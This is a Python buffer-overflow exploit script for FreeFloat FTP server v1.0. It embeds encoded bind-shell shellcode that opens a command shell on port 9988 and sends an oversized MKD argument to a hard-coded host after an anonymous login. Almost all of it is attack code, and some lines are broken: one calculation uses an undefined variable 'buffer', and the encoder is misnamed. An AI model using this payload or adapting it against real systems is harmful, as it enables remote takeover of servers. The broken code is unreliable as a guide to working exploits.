#!/usr/bin/python

# This is a buffer overflow exploit for FreeFloat FTP server v1.0
# Written by Andrew Lewis with help from FuzzySecurity.com
# Tested on Windows XP Professional SP3

import socket
import sys

# msfpayload windows/shell_bind_tcp LHOST=192.168.237.133 LPORT=9988 R | mdfencode -b "\x00\x0a\x0d" -t c
shellcode = (
"\xd9\xce\xd9\x74\x24\xf4\xba\x29\x72\xf4\x42\x58\x29\xc9\xb1"
"\x56\x83\xc0\x04\x31\x50\x14\x03\x50\x3d\x90\x01\xbe\xd5\xdd"
"\xea\x3f\x25\xbe\x63\xda\x14\xec\x10\xae\x04\x20\x52\xe2\xa4"
"\xcb\x36\x17\x3f\xb9\x9e\x18\x88\x74\xf9\x17\x09\xb9\xc5\xf4"
"\xc9\xdb\xb9\x06\x1d\x3c\x83\xc8\x50\x3d\xc4\x35\x9a\x6f\x9d"
"\x32\x08\x80\xaa\x07\x90\xa1\x7c\x0c\xa8\xd9\xf9\xd3\x5c\x50"
"\x03\x04\xcc\xef\x4b\xbc\x67\xb7\x6b\xbd\xa4\xab\x50\xf4\xc1"
"\x18\x22\x07\x03\x51\xcb\x39\x6b\x3e\xf2\xf5\x66\x3e\x32\x31"
"\x98\x35\x48\x41\x25\x4e\x8b\x3b\xf1\xdb\x0e\x9b\x72\x7b\xeb"
"\x1d\x57\x1a\x78\x11\x1c\x68\x26\x36\xa3\xbd\x5c\x42\x28\x40"
"\xb3\xc2\x6a\x67\x17\x8e\x29\x06\x0e\x6a\x9c\x37\x50\xd2\x41"
"\x92\x1a\xf1\x96\xa4\x40\x9e\x5b\x9b\x7a\x5e\xf3\xac\x09\x6c"
"\x5c\x07\x86\xdc\x15\x81\x51\x22\x0c\x75\xcd\xdd\xae\x86\xc7"
"\x19\xfa\xd6\x7f\x8b\x82\xbc\x7f\x34\x57\x12\xd0\x9a\x07\xd3"
"\x80\x5a\xf7\xbb\xca\x54\x28\xdb\xf4\xbe\x5f\xdb\x3a\x9a\x0c"
"\x8c\x3e\x1c\x95\x48\xb6\xfa\xb3\x40\x9e\x55\x2b\xa3\xc5\x6d"
"\xcc\xdc\x2f\xc2\x45\x4b\x67\x0c\x51\x74\x78\x1a\xf2\xd9\xd0"
"\xcd\x80\x31\xe5\xec\x97\x1f\x4d\x66\xa0\xc8\x07\x16\x63\x68"
"\x17\x33\x13\x09\x8a\xd8\xe3\x44\xb7\x76\xb4\x01\x09\x8f\x50"
"\xbc\x30\x39\x46\x3d\xa4\x02\xc2\x9a\x15\x8c\xcb\x6f\x21\xaa"
"\xdb\xa9\xaa\xf6\x8f\x65\xfd\xa0\x79\xc0\x57\x03\xd3\x9a\x04"
"\xcd\xb3\x5b\x67\xce\xc5\x63\xa2\xb8\x29\xd5\x1b\xfd\x56\xda"
"\xcb\x09\x2f\x06\x6c\xf5\xfa\x82\x9c\xbc\xa6\xa3\x34\x19\x33"
"\xf6\x58\x9a\xee\x35\x65\x19\x1a\xc6\x92\x01\x6f\xc3\xdf\x85"
"\x9c\xb9\x70\x60\xa2\x6e\x70\xa1")
buffered_shellcode = "\x90" * 20 + shellcode
evil = "A"*247 + "\x77\xb2\xfa\x77" + buffered_shellcode + "\x90"*(749-len(buffer)) # 1,000 bytes total

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.163.134',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close